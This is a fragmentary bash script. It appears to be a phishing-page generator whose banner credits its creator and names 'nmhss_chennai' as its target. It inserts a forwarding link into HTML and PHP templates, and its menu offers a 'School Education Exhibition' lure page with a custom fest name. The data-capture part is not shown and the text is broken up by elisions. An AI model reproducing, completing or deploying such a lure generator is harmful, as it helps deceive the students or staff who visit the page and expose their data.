...
banner() {
clear
printf "\e[1;96m     _     _ _              _         \e[0m\n"
printf "\e[1;96m    | |   (_) |            | |        \e[0m\n"
printf "\e[1;96m ___| |__  _| |_       _ __| | ____ _ \e[0m\n"
printf "\e[1;96m/ __| '_ \| | __|     | '__| |/ / _\` |\e[0m\n"
printf "\e[1;96m\__ \ | | | | |_   _  | |  |   < (_| |\e[0m\n"
printf "\e[1;96m|___/_| |_|_|\__| (_) |_|  |_|\_\__,_|\e[0m\n"
printf "\e[1;96m                                      \e[0m\n"
printf "\e[1;96m  creater:tthxrunn   ||  for:nmhss_chennai  \e[0m\n"
...
sed 's+forwarding_link+'$link'+g' .html > index3.html
...
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' school.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
...
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m School Education Exhibition \e[0m\n"

default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] loding data.............. \e[0m' fest_name
